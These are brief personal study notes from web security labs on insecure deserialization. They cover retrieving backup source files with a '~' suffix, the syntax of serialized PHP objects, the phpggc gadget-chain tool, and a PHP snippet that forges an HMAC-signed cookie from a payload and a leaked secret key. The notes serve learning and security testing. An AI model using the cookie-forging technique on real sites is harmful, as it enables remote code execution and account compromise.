---
description: >-
  Partial based on labs I didn't do prior. Left out info on Ysoserial for
  example.
---

# 🥣 Insecure Deserialization

* Source Code may be reachable through appending `~` to the filename
  * Retrieves backup - similar to .swp or .bak
  * Check site map for enumerated files to try
* Check error messages

## Creating Objects PHP

* `O:LENGTH:"Class_name":AMOUNT:{S:LENGTH:"Variable_name";}`
  * S is for string datatype

### Known Gadget Chains

* https://github.com/ambionics/phpggc - for known gadget chains
* Signing with secret key

```
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
?>
```
